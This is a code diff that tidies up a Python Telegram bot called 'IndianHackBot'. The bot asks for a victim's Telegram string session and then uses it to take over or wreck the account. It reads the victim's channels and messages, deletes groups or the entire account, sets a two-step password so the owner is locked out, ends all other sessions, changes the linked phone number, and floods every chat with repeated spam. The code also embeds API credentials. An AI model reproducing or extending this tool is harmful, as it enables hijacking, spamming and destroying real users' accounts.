@@ -445,11 +445,7 @@ async def op(event):
       ]         
     await event.reply("Click Below To Use Me", buttons=IndianHack)
   else:
-    legendbye = [
-      [
-        Button.url("Must Join", f"https://t.me/BestiesWorld")
-        ]
-      ]
+    legendbye = [[Button.url("Must Join", "https://t.me/BestiesWorld")]]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
     
        
@@ -496,25 +492,22 @@ async def start(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
-      try:
-        i = await userchannels(strses.text)
-      except:
-        return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
-      if len(i) > 3855:
-        file = open("session.txt", "w")
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
+    try:
+      i = await userchannels(strses.text)
+    except:
+      return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
+    if len(i) > 3855:
+      with open("session.txt", "w") as file:
         file.write(i + "\n\nDetails BY @IndianHack_XD")
-        file.close()
-        await bot.send_file(event.chat_id, "session.txt")
-        system("rm -rf session.txt")
-      else:
-        await event.reply(i + "\n\nThanks For using IndianHackBot. \n/hack", buttons=keyboard)
+      await bot.send_file(event.chat_id, "session.txt")
+      system("rm -rf session.txt")
+    else:
+      await event.reply(i + "\n\nThanks For using IndianHackBot. \n/hack", buttons=keyboard)
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -522,9 +515,7 @@ async def users(event):
     await x.send_message("GIVE STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
-    if op:
-      pass
-    else:
+    if not op:
       return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
     await event.reply(i + "\n\nThanks For using IndianHack Bot.\n/hack", buttons=keyboard)
@@ -535,9 +526,7 @@ async def users(event):
     await x.send_message("GIVE STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
-    if op:
-      pass
-    else:
+    if not op:
       return await event.respond("String Session Has Been Terminated", buttons=keyboard)
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
@@ -547,15 +536,13 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using IndianHack Bot", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    i = await usermsgs(strses.text)
+    await event.reply(i + "\n\nThanks For using IndianHack Bot", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -564,9 +551,7 @@ async def users(event):
     await x.send_message("GIVE STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
-    if op:
-      pass
-    else:
+    if not op:
       return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
@@ -579,9 +564,7 @@ async def users(event):
     await x.send_message("GIVE STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
-    if op:
-      pass
-    else:
+    if not op:
       return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
@@ -590,122 +573,108 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using IndianHackBot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+    grpid = await x.get_response()
+    await delgroup(strses.text, grpid.text)
+    await event.reply("Deleted the Channel/Group Thanks For using IndianHackBot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
-      i = await user2fa(strses.text)
-      if i:
-        await event.reply("User don't have two step thats why now two step is `IndianHack Bot Is best` you can login now\n\nThanks For using IndianHack Bot.", buttons=keyboard)
-      else:
-        await event.reply("Sorry User Have two step already", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
+    i = await user2fa(strses.text)
+    if i:
+      await event.reply("User don't have two step thats why now two step is `IndianHack Bot Is best` you can login now\n\nThanks For using IndianHack Bot.", buttons=keyboard)
+    else:
+      await event.reply("Sorry User Have two step already", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using IndianHackBot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    i = await terminate(strses.text)
+    await event.reply("The all sessions are terminated\n\nThanks For using IndianHackBot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using IndianHack Bot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    i = await delacc(strses.text)
+    await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using IndianHack Bot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
-      user = await x.get_response()
-      i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+    grp = await x.get_response()
+    await x.send_message("NOW GIVE USER USERNAME")
+    user = await x.get_response()
+    i = await promote(strses.text, grp.text, user.text)
+    await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      pro = await x.get_response()
-      try:
-        i = await demall(strses.text, pro.text)
-      except:
-        pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using IndianHackBot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+    pro = await x.get_response()
+    try:
+      i = await demall(strses.text, pro.text)
+    except:
+      pass
+    await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using IndianHackBot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession is terminated maybe", buttons=keyboard)
+    await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+    number = (await x.get_response()).text
+    try:
+      result = await change_number(strses.text, number)
+      await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+      await asyncio.sleep(20)
+      await x.send_message("NOW GIVE PHONE CODE HASH")
+      phone_code_hash = (await x.get_response()).text
+      await x.send_message("NOW GIVE THE OTP")
+      otp = (await x.get_response()).text
+      changing = await change_number_code(strses.text, number, phone_code_hash, otp)
+      if changing:
+        await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
       else:
-        return await event.respond("This StringSession is terminated maybe", buttons=keyboard)
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
-      number = (await x.get_response()).text
-      try:
-        result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
-        await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
-        phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
-        otp = (await x.get_response()).text
-        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
-        if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
-        else:
-          await event.respond("Something is wrong")
-      except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @Ids_Holder\n**LOGS**\n" + str(e))
+        await event.respond("Something is wrong")
+    except Exception as e:
+      await event.respond("SEND THIS ERROR TO - @Ids_Holder\n**LOGS**\n" + str(e))
 
 
 
@@ -726,182 +695,174 @@ async def start(event):
 
 
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      reply_msg = msg
+      tol = reply_msg
+      file = None
+      async for aman in X.iter_dialogs():
+        chat = aman.id
         try:
-            reply_msg = msg
-            tol = reply_msg
-            file = None
-            async for aman in X.iter_dialogs():
-                chat = aman.id
-                try:
-                    await X.send_message(chat, tol, file=file)     
-                    if lol != -1001551357238:
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                    elif chat == -1001606996743:
-                        pass
-                    await asyncio.sleep()
-                except Exception as e:
-                    print(e)
+          await X.send_message(chat, tol, file=file)
+          if lol != -1001551357238:
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+            await asyncio.sleep(60)
+            await X.send_message(chat, tol, file=file)
+          await asyncio.sleep()
         except Exception as e:
-            print(e)        
+            print(e)
+    except Exception as e:
+        print(e)        
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE MSG")
-      msg = await x.get_response()
-      await x.send_message("Now Done It Will Send message automatically every 10 min")
-      i = await gcasta(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("NOW GIVE MSG")
+    msg = await x.get_response()
+    await x.send_message("Now Done It Will Send message automatically every 10 min")
+    i = await gcasta(strses.text, msg.text)
+    await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
 
 molb = True
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try:
-            reply_msg = msg
-            tol = reply_msg
-            file = None
-            async for sweetie in X.iter_dialogs():
-                if sweetie.is_group:
-                    chat = sweetie.id
-                    try:
-                        if chat != -1001606996743:
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(600)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(600)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            while molb != False:
-                                await asyncio.sleep(600)
-                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
-                        elif chat == -1001606996743:
-                            pass
-                    except Exception as e:
-                        print(e)
-        except Exception as e:
-            print(e)
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+      reply_msg = msg
+      tol = reply_msg
+      file = None
+      async for sweetie in X.iter_dialogs():
+        if sweetie.is_group:
+          chat = sweetie.id
+          try:
+            if chat != -1001606996743:
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(600)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(600)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              await asyncio.sleep(60)
+              await X.send_message(chat, tol, file=file)
+              while molb != False:
+                  await asyncio.sleep(600)
+                  await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
+          except Exception as e:
+              print(e)
+    except Exception as e:
+        print(e)
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE MSG")
-      msg = await x.get_response()
-      await x.send_message("Now Done It Will Send message automatically every 10 min")
-      i = await gcastb(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("NOW GIVE MSG")
+    msg = await x.get_response()
+    await x.send_message("Now Done It Will Send message automatically every 10 min")
+    i = await gcastb(strses.text, msg.text)
+    await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
 
 async def gcastc(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -925,18 +886,16 @@ async def gcastc(strses, msg):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE MSG IT WILL AUTOMATALLY START")
-      msg = await x.get_response()
-      await x.send_message("Now Done It Will Send message automatically every 10 min")
-      i = await gcastc(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
+    await x.send_message("GIVE STRING SESSION")
+    strses = await x.get_response()
+    op = await cu(strses.text)
+    if not op:
+      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+    await x.send_message("NOW GIVE MSG IT WILL AUTOMATALLY START")
+    msg = await x.get_response()
+    await x.send_message("Now Done It Will Send message automatically every 10 min")
+    i = await gcastc(strses.text, msg.text)
+    await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
 
 print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @IndianSupportGroup")
 client.run_until_disconnected()
